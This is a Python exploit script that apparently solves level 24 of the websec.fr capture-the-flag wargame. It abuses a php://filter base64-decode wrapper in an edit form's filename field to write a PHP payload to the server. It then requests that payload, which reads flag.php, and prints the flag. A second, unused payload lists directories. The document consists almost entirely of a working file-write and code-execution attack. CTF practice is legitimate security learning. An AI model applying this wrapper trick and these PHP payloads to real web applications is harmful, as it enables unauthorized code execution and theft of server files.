from requests import *
import base64

url = 'http://websec.fr/level24/index.php'
s = Session()

payload1 = "<?php echo var_dump(scandir('../..'));?>"
payload2 = "<?php echo file_get_contents('../../flag.php'); ?>"

s.get(url)
phpsessid = s.cookies.get_dict()['PHPSESSID']

url = 'http://websec.fr/level24/index.php?p=edit&filename=php://filter/convert.base64-decode/resource=flag.php'
data = {
    'filename' : 'php://filter/convert.base64-decode/resource=flag.php',
    'data' : base64.b64encode(payload2.encode('utf-8')).decode('utf-8')
}

s.post(url , data=data)

url = 'http://websec.fr/level24/uploads/{0}/flag.php'.format(phpsessid)
r = s.get(url)
pos = r.text.find('WEBSEC{')
while(True):
    txt = r.text[pos]
    print(txt , end='')

    if txt == '}':
        print()
        break

    pos += 1
